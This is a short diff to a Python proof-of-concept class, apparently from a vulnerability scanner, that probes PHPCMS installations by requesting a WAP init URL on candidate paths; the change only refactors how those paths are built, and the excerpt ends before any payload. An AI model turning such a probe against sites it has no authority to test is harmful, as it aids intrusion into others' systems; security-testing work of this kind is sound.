@@ -24,14 +24,8 @@ class POC(Script):
         await self.get_url()
         if self.base_url:
             headers = {"User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.4 (KHTML, like Gecko) Chrome/6.0.481.0 Safari/534.4"}
-            path_list = list(set([
-                self.url_normpath(self.base_url, '/'),
-                self.url_normpath(self.base_url, '../phpcms/'),
-                self.url_normpath(self.url, 'phpcms/'),
-                self.url_normpath(self.url, '../phpcms/'),
-            ]))
             async with ClientSession() as session:
-                for path in path_list:
+                for path in self.url_normpath(self.url, ['./phpcms/', './']):
                     url1 = path +"index.php?m=wap&c=index&a=init&siteid=1"
                     async with session.get(url=url1, headers = headers) as res1:
                         if res1 !=None:
